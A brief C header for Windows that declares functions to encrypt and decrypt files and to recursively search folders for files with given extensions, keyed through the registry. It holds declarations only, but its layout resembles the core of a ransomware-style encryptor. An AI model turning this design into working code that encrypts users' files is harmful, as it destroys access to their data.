#pragma once
#include <windows.h>
#include <wincrypt.h>
#include <stdbool.h>
#include "StringManips.h"

void EncryptBytes(WCHAR filePath[], HKEY hKey);
void DecryptBytes(WCHAR filePath[], HKEY hKey);
WCHAR* RecursiveDirSearch(WCHAR folder[], WCHAR listOfFileExtensions[], HKEY hKey, bool decrypt);